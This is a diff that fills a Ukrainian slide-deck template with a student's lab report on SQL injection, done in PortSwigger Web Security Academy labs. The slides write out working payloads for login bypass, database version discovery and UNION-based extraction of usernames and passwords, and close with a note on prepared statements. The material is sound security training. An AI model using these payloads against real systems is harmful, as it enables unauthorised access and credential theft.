@@ -3,249 +3,295 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Презентація — макет</title>
+<title>SQL-ін'єкції — Лабораторна робота №8</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="styles.css">
 </head>
 <body>
 <canvas id="bg" aria-hidden="true"></canvas>
 <div class="shade" aria-hidden="true"></div>
 
-<div class="viewport">
-  <div class="stage" id="stage">
-
-    <!-- Top bar (як навігація в референсі) -->
-    <header class="topbar">
-      <div class="brand"><span class="mark"></span><span data-edit>Назва проєкту</span></div>
+<header class="topbar">
+      <div class="brand"><span class="mark"></span><span>SQL Injection · Лаб. №8</span></div>
       <nav class="sections" id="sections">
         <span data-section="intro">Вступ</span>
-        <span data-section="theory">Теорія</span>
-        <span data-section="practice">Практика</span>
-        <span data-section="results">Результати</span>
+        <span data-section="logic">Логіка запиту</span>
+        <span data-section="recon">Розвідка СУБД</span>
+        <span data-section="leak">Витік даних</span>
         <span data-section="outro">Висновки</span>
       </nav>
       <div class="topbar-right">
-        <span class="pill ghost" data-edit>Група / Курс</span>
-        <span class="pill solid" id="counter">01 / 15</span>
+        <span class="pill ghost">КБ-307</span>
+        <span class="pill solid" id="counter">01 / 17</span>
       </div>
     </header>
+
+    <main class="deck" id="deck">
 
     <!-- 01 — Титул -->
     <section class="slide hero" data-bg="hero" data-section="intro">
       <div class="center">
-        <p class="eyebrow r">Лабораторна робота № 5 · 2026</p>
-        <h1 class="display r">Назва теми презентації<br><span class="dim">у два рядки, як у референсі</span></h1>
-        <p class="lead r">Короткий підзаголовок: одне речення про що ця робота і навіщо вона.</p>
+        <p class="eyebrow r">Лабораторна робота №8 · Безпека веб-додатків</p>
+        <h1 class="display r">SQL-ін'єкції<br><span class="dim">від прихованих даних до паролів адміністратора</span></h1>
+        <p class="lead r">Отримання даних, обхід авторизації, визначення структури БД та витік конфіденційної інформації.</p>
         <div class="row r">
-          <span class="pill outline">Виконав: Прізвище І. П.</span>
-          <span class="pill outline">Перевірив: Прізвище І. П.</span>
+          <span class="pill outline">Виконала: Дзяман Наталія, КБ-307</span>
+          <span class="pill outline">Прийняв: Побережник В. О.</span>
         </div>
       </div>
-      <p class="foot r">Натисніть → або пробіл</p>
+      <p class="foot r">НУ «Львівська політехніка» · ІКТА · кафедра ЗІ · 2026</p>
     </section>
 
-    <!-- 02 — Зміст -->
+    <!-- 02 — Мета -->
     <section class="slide" data-bg="right" data-section="intro">
-      <div class="content left-col">
-        <p class="eyebrow r">Зміст</p>
-        <h2 class="title r">План презентації</h2>
-        <ol class="agenda">
-          <li class="r"><b>01</b><span>Вступ, мета і завдання</span></li>
-          <li class="r"><b>02</b><span>Теоретична частина</span></li>
-          <li class="r"><b>03</b><span>Хід роботи</span></li>
-          <li class="r"><b>04</b><span>Практична частина та скриншоти</span></li>
-          <li class="r"><b>05</b><span>Результати й таблиці</span></li>
-          <li class="r"><b>06</b><span>Висновки</span></li>
-        </ol>
+      <div class="content">
+        <p class="eyebrow r">Мета роботи</p>
+        <h2 class="title r">Зрозуміти SQL-ін'єкції — <span class="dim">чому виникають, як знайти, експлуатувати й закрити</span></h2>
+        <div class="grid3">
+          <article class="card r"><span class="num">ЧОМУ</span><h3>Ввід стає кодом</h3><p>Дані користувача підставляються в SQL-запит без фільтрації чи параметризації — і змінюють його логіку.</p></article>
+          <article class="card r"><span class="num">ДЕ</span><h3>WHERE, логін, UNION</h3><p>Параметри URL, поля форми входу, вибірки товарів — будь-яке місце, де ввід потрапляє в запит.</p></article>
+          <article class="card r"><span class="num">ЗАХИСТ</span><h3>Prepared Statements</h3><p>Параметризовані запити та сувора валідація й санітизація всього, що надходить від користувача.</p></article>
+        </div>
+        <p class="note r">Усі атаки виконано в контрольованому середовищі <b>PortSwigger Web Security Academy</b>.</p>
       </div>
     </section>
 
-    <!-- 03 — Вступ -->
+    <!-- 03 — Завдання -->
     <section class="slide" data-bg="top" data-section="intro">
       <div class="content">
-        <p class="eyebrow r">Вступ</p>
-        <h2 class="title r">Актуальність теми<br><span class="dim">одним сильним реченням</span></h2>
-        <div class="grid3">
-          <article class="card r"><span class="num">01</span><h3>Перша теза</h3><p>Два-три рядки пояснення. Текст замінимо після того, як надішлеш звіт.</p></article>
-          <article class="card r"><span class="num">02</span><h3>Друга теза</h3><p>Два-три рядки пояснення. Текст замінимо після того, як надішлеш звіт.</p></article>
-          <article class="card r"><span class="num">03</span><h3>Третя теза</h3><p>Два-три рядки пояснення. Текст замінимо після того, як надішлеш звіт.</p></article>
-        </div>
-      </div>
-    </section>
-
-    <!-- 04 — Мета і завдання -->
-    <section class="slide" data-bg="left" data-section="intro">
-      <div class="content right-col">
-        <p class="eyebrow r">Мета і завдання</p>
-        <h2 class="title r">Мета роботи — <span class="dim">формулювання мети з методички</span></h2>
-        <ul class="checklist">
-          <li class="r">Завдання 1 — коротке формулювання</li>
-          <li class="r">Завдання 2 — коротке формулювання</li>
-          <li class="r">Завдання 3 — коротке формулювання</li>
-          <li class="r">Завдання 4 — коротке формулювання</li>
-        </ul>
-      </div>
-    </section>
-
-    <!-- 05 — Розділ -->
-    <section class="slide hero" data-bg="section" data-section="theory">
-      <div class="center">
-        <p class="eyebrow r">Розділ 01</p>
-        <h1 class="display r">Теоретична<br><span class="dim">частина</span></h1>
-      </div>
-    </section>
-
-    <!-- 06 — Теорія -->
-    <section class="slide" data-bg="corner" data-section="theory">
-      <div class="content">
-        <p class="eyebrow r">Основні поняття</p>
-        <h2 class="title r">Ключові терміни</h2>
-        <div class="grid2">
-          <article class="card r"><h3>Термін А</h3><p>Визначення в 2–3 рядки. Без води, тільки те, що потрібно для розуміння практичної частини.</p></article>
-          <article class="card r"><h3>Термін Б</h3><p>Визначення в 2–3 рядки. Без води, тільки те, що потрібно для розуміння практичної частини.</p></article>
-          <article class="card r"><h3>Термін В</h3><p>Визначення в 2–3 рядки. Без води, тільки те, що потрібно для розуміння практичної частини.</p></article>
-          <article class="card r"><h3>Термін Г</h3><p>Визначення в 2–3 рядки. Без води, тільки те, що потрібно для розуміння практичної частини.</p></article>
-        </div>
-      </div>
-    </section>
-
-    <!-- 07 — Хід роботи -->
-    <section class="slide" data-bg="bottom" data-section="theory">
-      <div class="content">
-        <p class="eyebrow r">Хід роботи</p>
-        <h2 class="title r">Як виконувалась робота</h2>
-        <ol class="steps">
-          <li class="r"><span class="dot"></span><b>Крок 1</b><p>Підготовка середовища та вихідних даних</p></li>
-          <li class="r"><span class="dot"></span><b>Крок 2</b><p>Реалізація основної частини завдання</p></li>
-          <li class="r"><span class="dot"></span><b>Крок 3</b><p>Тестування та збір результатів</p></li>
-          <li class="r"><span class="dot"></span><b>Крок 4</b><p>Аналіз і порівняння отриманих даних</p></li>
+        <p class="eyebrow r">Завдання</p>
+        <h2 class="title r">7 лабораторій — <span class="dim">від простого до витоку даних</span></h2>
+        <ol class="agenda two">
+          <li class="r"><b>01</b><span>WHERE: отримання прихованих даних</span></li>
+          <li class="r"><b>02</b><span>Обхід авторизації (login bypass)</span></li>
+          <li class="r"><b>03</b><span>Тип і версія СУБД — Oracle</span></li>
+          <li class="r"><b>04</b><span>Тип і версія — MySQL / Microsoft</span></li>
+          <li class="r"><b>05</b><span>Вміст БД — не-Oracle</span></li>
+          <li class="r"><b>06</b><span>Вміст БД — Oracle</span></li>
+          <li class="r"><b>07</b><span>UNION: кількість стовпців запиту</span></li>
+          <li class="r done"><b>✓</b><span>Усі 7 лабораторій розв'язано</span></li>
         </ol>
       </div>
     </section>
 
-    <!-- 08 — Розділ -->
-    <section class="slide hero" data-bg="wide" data-section="practice">
+    <!-- 04 — Анатомія -->
+    <section class="slide" data-bg="left" data-section="logic">
+      <div class="content">
+        <p class="eyebrow r">Анатомія атаки</p>
+        <h2 class="title r">Три символи, що <span class="dim">переписують запит</span></h2>
+        <div class="code big r"><span class="kw">SELECT</span> * <span class="kw">FROM</span> products <span class="kw">WHERE</span> category = 'Gifts<span class="inj">' OR 1=1--</span><span class="cm"> AND released = 1</span></div>
+        <div class="grid3 tokens">
+          <article class="card r"><span class="tok">'</span><h3>Закриває рядок</h3><p>Одинарна лапка завершує строкове значення — далі можна писати власний SQL.</p></article>
+          <article class="card r"><span class="tok">OR 1=1</span><h3>Завжди істина</h3><p>Умова виконується для кожного рядка, тож фільтр перестає щось відсіювати.</p></article>
+          <article class="card r"><span class="tok">--</span><h3>Решта — коментар</h3><p>Усе після подвійного дефіса, зокрема <code>AND released = 1</code>, ігнорується.</p></article>
+        </div>
+      </div>
+    </section>
+
+    <!-- 05 — Завдання 1 -->
+    <section class="slide" data-bg="corner" data-section="logic">
+      <div class="content task">
+        <div class="task-text">
+          <p class="eyebrow r">Завдання 1 · WHERE</p>
+          <h2 class="title r">Приховані товари <span class="dim">стають видимими</span></h2>
+          <p class="body r">Параметр <code>category</code> з URL потрапляє в запит без фільтрації. Пейлоад вимикає умову <code>released = 1</code>, і база повертає всі рядки таблиці <code>products</code>.</p>
+          <div class="code r"><span class="cm">// було</span>
+<span class="kw">WHERE</span> category = 'Gifts' <span class="kw">AND</span> released = 1
+<span class="cm">// стало</span>
+<span class="kw">WHERE</span> category = 'Gifts<span class="inj">' OR 1=1--</span></div>
+          <p class="payload r">Пейлоад: <code>Gifts' OR 1=1--</code></p>
+        </div>
+        <figure class="r"><div class="frame" style="--mh: 700px"><img src="img/t1-solved.png" alt="Приховані товари після інʼєкції"></div><figcaption>Рис. 2 — сторінка показує приховані товари, лабораторію розв'язано</figcaption></figure>
+      </div>
+    </section>
+
+    <!-- 06 — Завдання 2 -->
+    <section class="slide" data-bg="bottom" data-section="logic">
+      <div class="content task">
+        <div class="task-text">
+          <p class="eyebrow r">Завдання 2 · Login bypass</p>
+          <h2 class="title r">Вхід адміністратором <span class="dim">без пароля</span></h2>
+          <p class="body r">У поле <b>Username</b> введено <code>administrator'--</code>, пароль — будь-який. Перевірка пароля перетворюється на коментар.</p>
+          <div class="code r"><span class="kw">SELECT</span> * <span class="kw">FROM</span> users
+<span class="kw">WHERE</span> username = 'administrator<span class="inj">'--</span><span class="cm"> AND password = '...'</span></div>
+          <p class="payload r">Результат: сесія адміністратора без перевірки пароля</p>
+        </div>
+        <div class="stack">
+          <figure class="r"><div class="frame" style="--mh: 250px"><img src="img/t2-login.png" alt="Форма входу з пейлоадом"></div><figcaption>Рис. 3 — пейлоад у полі Username</figcaption></figure>
+          <figure class="r"><div class="frame" style="--mh: 320px"><img src="img/t2-admin.png" alt="Обліковий запис адміністратора"></div><figcaption>Рис. 4 — вхід як administrator</figcaption></figure>
+        </div>
+      </div>
+    </section>
+
+    <!-- 07 — Розділ -->
+    <section class="slide hero" data-bg="section" data-section="recon">
       <div class="center">
-        <p class="eyebrow r">Розділ 02</p>
-        <h1 class="display r">Практична<br><span class="dim">частина</span></h1>
+        <p class="eyebrow r">Завдання 3–4</p>
+        <h1 class="display r">Розвідка СУБД<br><span class="dim">UNION-атаки на тип і версію</span></h1>
+        <p class="lead r">Знаючи СУБД, можна обрати правильний синтаксис і системні таблиці для наступних кроків.</p>
       </div>
     </section>
 
-    <!-- 09 — Скриншот великий -->
-    <section class="slide" data-bg="top" data-section="practice">
-      <div class="content">
-        <p class="eyebrow r">Скриншот 1</p>
-        <h2 class="title r">Назва кроку на скриншоті</h2>
-        <figure class="shot big r"><div class="ph">Місце для скриншота 1 · 16:9</div></figure>
-        <p class="caption r">Рис. 1 — підпис до скриншота: що саме тут видно.</p>
-      </div>
-    </section>
-
-    <!-- 10 — Два скриншоти -->
-    <section class="slide" data-bg="bottom" data-section="practice">
-      <div class="content">
-        <p class="eyebrow r">Скриншоти 2–3</p>
-        <h2 class="title r">Порівняння двох станів</h2>
-        <div class="grid2 shots">
-          <figure class="r"><div class="shot"><div class="ph">Скриншот 2</div></div><figcaption>Рис. 2 — до</figcaption></figure>
-          <figure class="r"><div class="shot"><div class="ph">Скриншот 3</div></div><figcaption>Рис. 3 — після</figcaption></figure>
+    <!-- 08 — Завдання 3 -->
+    <section class="slide" data-bg="right" data-section="recon">
+      <div class="content task">
+        <div class="task-text">
+          <p class="eyebrow r">Завдання 3 · Oracle</p>
+          <h2 class="title r">Версія Oracle <span class="dim">через v$version</span></h2>
+          <ol class="steps-v">
+            <li class="r"><b>Скільки стовпців?</b><code>' UNION SELECT NULL,NULL FROM DUAL--</code><span>Без помилки → запит повертає 2 стовпці. В Oracle <code>FROM</code> обов'язковий, тому <code>DUAL</code>.</span></li>
+            <li class="r"><b>Читаємо версію</b><code>' UNION SELECT banner,NULL FROM v$version--</code><span>Стовпець <code>banner</code> системного подання з версією.</span></li>
+          </ol>
+          <p class="payload r">Oracle Database 11g Express Edition Release 11.2.0.2.0</p>
         </div>
+        <figure class="r"><div class="frame" style="--mh: 700px"><img src="img/t3-version.png" alt="Версія Oracle на сторінці"></div><figcaption>Рис. 9 — версія СУБД серед списку товарів</figcaption></figure>
       </div>
     </section>
 
-    <!-- 11 — Скриншот + пояснення -->
-    <section class="slide" data-bg="left" data-section="practice">
-      <div class="content split">
-        <div>
-          <p class="eyebrow r">Скриншот 4</p>
-          <h2 class="title r">Деталь реалізації</h2>
-          <ul class="checklist">
-            <li class="r">Що зроблено на цьому етапі</li>
-            <li class="r">Який параметр важливий</li>
-            <li class="r">Що з цього випливає</li>
-          </ul>
+    <!-- 09 — Завдання 4 -->
+    <section class="slide" data-bg="left" data-section="recon">
+      <div class="content task">
+        <div class="task-text">
+          <p class="eyebrow r">Завдання 4 · MySQL / Microsoft</p>
+          <h2 class="title r">Версія через <span class="dim">@@version</span></h2>
+          <ol class="steps-v">
+            <li class="r"><b>Скільки стовпців?</b><code>'+UNION+SELECT+NULL,NULL%23</code><span>Тут <code>FROM</code> не потрібен. Коментар <code>#</code> в URL кодується як <code>%23</code>.</span></li>
+            <li class="r"><b>Читаємо версію</b><code>'+UNION+SELECT+@@version,NULL%23</code><span>Глобальна змінна <code>@@version</code> повертає версію сервера.</span></li>
+          </ol>
+          <p class="payload r">8.0.42-0ubuntu0.20.04.1</p>
         </div>
-        <figure class="shot tall r"><div class="ph">Скриншот 4</div></figure>
+        <figure class="r"><div class="frame" style="--mh: 700px"><img src="img/t4-version.png" alt="Версія MySQL на сторінці"></div><figcaption>Рис. 14 — версія бази даних вилучена</figcaption></figure>
       </div>
     </section>
 
-    <!-- 12 — Таблиця 1 -->
-    <section class="slide" data-bg="corner" data-section="results">
+    <!-- 10 — Порівняння СУБД -->
+    <section class="slide" data-bg="top" data-section="recon">
       <div class="content">
-        <p class="eyebrow r">Таблиця 1</p>
-        <h2 class="title r">Вихідні дані / результати вимірювань</h2>
+        <p class="eyebrow r">Порівняння</p>
+        <h2 class="title r">Одна атака — <span class="dim">різний синтаксис</span></h2>
         <div class="table-wrap r">
-          <table>
-            <thead><tr><th>№</th><th>Параметр</th><th>Значення 1</th><th>Значення 2</th><th>Значення 3</th></tr></thead>
+          <table class="compare">
+            <thead><tr><th>Що потрібно</th><th>Oracle</th><th>MySQL / Microsoft</th></tr></thead>
             <tbody>
-              <tr><td>1</td><td>Назва параметра</td><td>—</td><td>—</td><td>—</td></tr>
-              <tr><td>2</td><td>Назва параметра</td><td>—</td><td>—</td><td>—</td></tr>
-              <tr><td>3</td><td>Назва параметра</td><td>—</td><td>—</td><td>—</td></tr>
-              <tr><td>4</td><td>Назва параметра</td><td>—</td><td>—</td><td>—</td></tr>
-              <tr><td>5</td><td>Назва параметра</td><td>—</td><td>—</td><td>—</td></tr>
+              <tr><td>Порожній SELECT</td><td><code>FROM DUAL</code> обов'язково</td><td>можна без <code>FROM</code></td></tr>
+              <tr><td>Версія</td><td><code>v$version</code> (banner)</td><td><code>@@version</code></td></tr>
+              <tr><td>Коментар</td><td><code>--</code></td><td><code>#</code> (→ <code>%23</code>) або <code>-- </code></td></tr>
+              <tr><td>Список таблиць</td><td><code>all_tables</code></td><td><code>information_schema.tables</code></td></tr>
+              <tr><td>Регістр імен</td><td>ВЕРХНІЙ</td><td>як є</td></tr>
             </tbody>
           </table>
         </div>
       </div>
     </section>
 
-    <!-- 13 — Ключові цифри -->
-    <section class="slide" data-bg="section" data-section="results">
-      <div class="content">
-        <p class="eyebrow r">Результати</p>
-        <h2 class="title r">Ключові показники</h2>
-        <div class="stats">
-          <div class="stat r"><b>00%</b><span>Показник 1</span></div>
-          <div class="stat r"><b>0.00</b><span>Показник 2</span></div>
-          <div class="stat r"><b>×0</b><span>Показник 3</span></div>
-          <div class="stat r"><b>000</b><span>Показник 4</span></div>
-        </div>
-        <p class="lead r">Одне речення, що пояснює головний результат.</p>
+    <!-- 11 — Розділ -->
+    <section class="slide hero" data-bg="wide" data-section="leak">
+      <div class="center">
+        <p class="eyebrow r">Завдання 5–6</p>
+        <h1 class="display r">Витік даних<br><span class="dim">структура БД → паролі користувачів</span></h1>
       </div>
     </section>
 
-    <!-- 14 — Таблиця 2 + висновки -->
-    <section class="slide" data-bg="right" data-section="outro">
+    <!-- 12 — Завдання 5 кроки -->
+    <section class="slide" data-bg="corner" data-section="leak">
+      <div class="content">
+        <p class="eyebrow r">Завдання 5 · не-Oracle · information_schema</p>
+        <h2 class="title r">Чотири кроки <span class="dim">до облікових даних</span></h2>
+        <div class="steps">
+          <li class="r"><span class="dot"></span><b>Стовпці</b><p><code>' UNION SELECT NULL,NULL--</code> → запит повертає 2 стовпці</p></li>
+          <li class="r"><span class="dot"></span><b>Таблиці</b><p><code>...table_name FROM information_schema.tables--</code> → знайдено <code>users_...</code></p></li>
+          <li class="r"><span class="dot"></span><b>Стовпці таблиці</b><p><code>...column_name ... WHERE table_name='users_...'--</code></p></li>
+          <li class="r"><span class="dot"></span><b>Паролі</b><p><code>' UNION SELECT username,password FROM users_...--</code></p></li>
+        </div>
+      </div>
+    </section>
+
+    <!-- 13 — Завдання 5 скриншоти -->
+    <section class="slide" data-bg="left" data-section="leak">
+      <div class="content">
+        <p class="eyebrow r">Завдання 5 · результат</p>
+        <h2 class="title r">Назви таблиць <span class="dim">і паролі користувачів</span></h2>
+        <div class="grid2 shots">
+          <figure class="r"><div class="frame" style="--mh: 560px"><img src="img/t5-tables.png" alt="Назви стовпців таблиці користувачів"></div><figcaption>Рис. 18 — стовпці таблиці <code>users_...</code></figcaption></figure>
+          <figure class="r"><div class="frame" style="--mh: 560px"><img src="img/t5-creds.png" alt="Паролі користувачів на сторінці"></div><figcaption>Рис. 21 — логіни й паролі, зокрема administrator</figcaption></figure>
+        </div>
+      </div>
+    </section>
+
+    <!-- 14 — Завдання 6 -->
+    <section class="slide" data-bg="bottom" data-section="leak">
+      <div class="content task">
+        <div class="task-text">
+          <p class="eyebrow r">Завдання 6 · Oracle</p>
+          <h2 class="title r">Те саме, <span class="dim">але без information_schema</span></h2>
+          <p class="body r">Oracle не має <code>information_schema</code>. Метадані беруться із системних таблиць, а імена об'єктів — у ВЕРХНЬОМУ регістрі.</p>
+          <div class="code r"><span class="cm">// таблиці</span>
+' UNION SELECT table_name,NULL FROM <span class="kw">all_tables</span>--
+<span class="cm">// стовпці</span>
+' UNION SELECT column_name,NULL FROM <span class="kw">all_tab_columns</span>
+  WHERE table_name='USERS_...'--</div>
+          <p class="payload r">Отримано пароль administrator → доступ до панелі</p>
+        </div>
+        <div class="stack">
+          <figure class="r"><div class="frame" style="--mh: 250px"><img src="img/t6-table.png" alt="Цільова таблиця Oracle"></div><figcaption>Рис. 27 — таблиця <code>USERS_...</code></figcaption></figure>
+          <figure class="r"><div class="frame" style="--mh: 320px"><img src="img/t6-creds.png" alt="Паролі користувачів Oracle"></div><figcaption>Рис. 31 — вилучені облікові дані</figcaption></figure>
+        </div>
+      </div>
+    </section>
+
+    <!-- 15 — Завдання 7 -->
+    <section class="slide" data-bg="right" data-section="leak">
+      <div class="content task">
+        <div class="task-text">
+          <p class="eyebrow r">Завдання 7 · основа UNION</p>
+          <h2 class="title r">Скільки стовпців <span class="dim">повертає запит?</span></h2>
+          <p class="body r">Для UNION обидва запити мають мати однакову кількість стовпців. Додаємо <code>NULL</code> по одному, поки помилка не зникне.</p>
+          <div class="code r">' UNION SELECT NULL--            <span class="cm">// помилка</span>
+' UNION SELECT NULL,NULL--       <span class="cm">// помилка</span>
+' UNION SELECT NULL,NULL,NULL--  <span class="hl">// успіх → 3</span></div>
+          <p class="payload r">Рівно 3 стовпці — лабораторію розв'язано</p>
+        </div>
+        <div class="stack">
+          <figure class="r"><div class="frame" style="--mh: 250px"><img src="img/t7-error.png" alt="Internal Server Error при неправильній кількості стовпців"></div><figcaption>Рис. 37 — Internal Server Error</figcaption></figure>
+          <figure class="r"><div class="frame" style="--mh: 320px"><img src="img/t7-solved.png" alt="Успішне розв'язання після трьох NULL"></div><figcaption>Рис. 39 — 3 × NULL, успіх</figcaption></figure>
+        </div>
+      </div>
+    </section>
+
+    <!-- 16 — Висновки -->
+    <section class="slide" data-bg="section" data-section="outro">
       <div class="content">
         <p class="eyebrow r">Висновки</p>
-        <h2 class="title r">Що ми отримали</h2>
-        <div class="table-wrap r">
-          <table>
-            <thead><tr><th>Критерій</th><th>Очікувано</th><th>Отримано</th><th>Висновок</th></tr></thead>
-            <tbody>
-              <tr><td>Критерій 1</td><td>—</td><td>—</td><td><span class="tag ok">Виконано</span></td></tr>
-              <tr><td>Критерій 2</td><td>—</td><td>—</td><td><span class="tag ok">Виконано</span></td></tr>
-              <tr><td>Критерій 3</td><td>—</td><td>—</td><td><span class="tag">Частково</span></td></tr>
-            </tbody>
-          </table>
+        <h2 class="title r">Що показала робота</h2>
+        <div class="grid2">
+          <article class="card r"><h3>Маніпуляція логікою</h3><p>Умови <code>' OR 1=1--</code> та <code>administrator'--</code> розкрили приховані дані й обійшли автентифікацію без пароля.</p></article>
+          <article class="card r"><h3>Розвідка СУБД</h3><p><code>v$version</code> і <code>@@version</code> дали тип і версію — відправну точку для наступних векторів атаки.</p></article>
+          <article class="card r"><h3>Повний витік</h3><p>Через <code>information_schema</code> та <code>all_tables</code> розкрито структуру БД і вилучено логіни й паролі.</p></article>
+          <article class="card accent r"><h3>Захист</h3><p>Параметризовані запити (Prepared Statements) і сувора валідація вводу. SQLi лишається однією з найнебезпечніших вразливостей.</p></article>
         </div>
-        <ol class="agenda compact">
-          <li class="r"><b>01</b><span>Перший висновок одним реченням</span></li>
-          <li class="r"><b>02</b><span>Другий висновок одним реченням</span></li>
-        </ol>
       </div>
     </section>
 
-    <!-- 15 — Фінал -->
+    <!-- 17 — Фінал -->
     <section class="slide hero" data-bg="hero" data-section="outro">
       <div class="center">
         <p class="eyebrow r">Дякую за увагу</p>
-        <h1 class="display r">Питання?<br><span class="dim">Готовий відповісти</span></h1>
+        <h1 class="display r">Питання?</h1>
         <div class="row r">
-          <span class="pill outline">Прізвище І. П.</span>
-          <span class="pill outline">Група</span>
+          <span class="pill outline">Дзяман Наталія · КБ-307</span>
+          <span class="pill outline">Безпека веб-додатків · №8</span>
         </div>
       </div>
     </section>
 
+    </main>
+
     <footer class="bottombar">
       <div class="progress"><i id="progress"></i></div>
-      <div class="hint">← → навігація · F — повний екран</div>
+      <div class="hint">↓ гортайте вниз · F — повний екран</div>
     </footer>
-  </div>
-</div>
 
 <script src="bg.js"></script>
 <script src="deck.js"></script>
